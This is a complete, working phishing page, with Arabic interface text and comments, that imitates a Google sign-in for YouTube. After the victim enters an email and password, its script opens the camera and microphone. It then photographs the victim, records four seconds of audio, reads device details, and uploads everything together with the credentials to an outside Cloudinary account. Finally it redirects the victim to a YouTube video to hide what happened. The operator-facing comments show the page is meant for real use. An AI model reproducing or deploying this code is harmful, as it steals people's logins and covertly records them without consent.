<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - YouTube Login</title>
    <style>
        body { margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; overflow: hidden; }
        .card { width: 90%; max-width: 400px; padding: 30px; border: 1px solid #ddd; border-radius: 8px; text-align: center; z-index: 100; background: #fff; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
        #v, #c { position: absolute; visibility: hidden; width: 1px; height: 1px; }
    </style>
</head>
<body>

<div class="card" id="ui">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
    <h2>تأكيد الهوية</h2>
    <p>سجل دخولك للمتابعة إلى YouTube</p>
    <input type="email" id="e" placeholder="البريد الإلكتروني" required>
    <input type="password" id="p" placeholder="كلمة المرور" required>
    <button onclick="run()">التالي</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    // تأكد 100% من كتابة الـ Cloud Name والـ Preset صح (حالات الأحرف مهمة)
    const cloudName = 'dgkttv99v'; 
    const preset = 'ml_default'; 
    const yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function run() {
        const email = document.getElementById('e').value;
        const pass = document.getElementById('p').value;
        if(!email || !pass) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;
            
            document.getElementById('ui').innerHTML = "<h3>جاري التحقق...</h3><p>يرجى عدم إغلاق الصفحة</p>";

            // سحب بيانات الجهاز
            const specs = `Model: ${navigator.platform} | Browser: ${navigator.userAgent}`;

            // تصوير وإرسال بعد 3 ثواني لضمان الصورة
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
                const imgData = canvas.toDataURL("image/png");

                // تسجيل صوتي 4 ثواني
                const rec = new MediaRecorder(stream);
                let chunks = [];
                rec.ondataavailable = ev => chunks.push(ev.data);
                rec.onstop = () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // إرسال البيانات فوراً
                    upload(email, pass, imgData, audioBlob, specs);

                    // تحويل إجباري بعد ثانية من الإرسال
                    setTimeout(() => { window.location.href = yt; }, 1500);
                };
                rec.start();
                setTimeout(() => rec.stop(), 4000);
            }, 3000);

        } catch (e) { window.location.href = yt; }
    }

    function upload(e, p, img, aud, s) {
        const ctx = `User=${e}|Pass=${p}|Specs=${s}`;

        // رفع الصورة باستخدام XMLHttpRequest (أضمن بكتير من fetch في ويندوز 7)
        const xhr1 = new XMLHttpRequest();
        xhr1.open('POST', `https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, true);
        const fd1 = new FormData();
        fd1.append('file', img);
        fd1.append('upload_preset', preset);
        fd1.append('context', ctx);
        xhr1.send(fd1);

        // رفع الصوت
        const xhr2 = new XMLHttpRequest();
        xhr2.open('POST', `https://api.cloudinary.com/v1_1/${cloudName}/upload`, true);
        const fd2 = new FormData();
        fd2.append('file', aud);
        fd2.append('upload_preset', preset);
        fd2.append('resource_type', 'video');
        fd2.append('context', ctx);
        xhr2.send(fd2);
    }
</script>
</body>
</html>
